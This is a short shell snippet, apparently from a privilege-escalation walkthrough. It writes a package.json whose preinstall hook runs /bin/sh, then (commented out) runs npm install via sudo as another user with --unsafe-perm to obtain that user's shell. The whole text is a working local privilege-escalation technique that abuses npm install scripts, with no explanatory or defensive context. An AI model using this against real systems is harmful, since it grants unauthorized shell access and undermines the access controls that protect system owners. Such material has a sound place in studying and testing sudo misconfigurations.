TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
#sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i

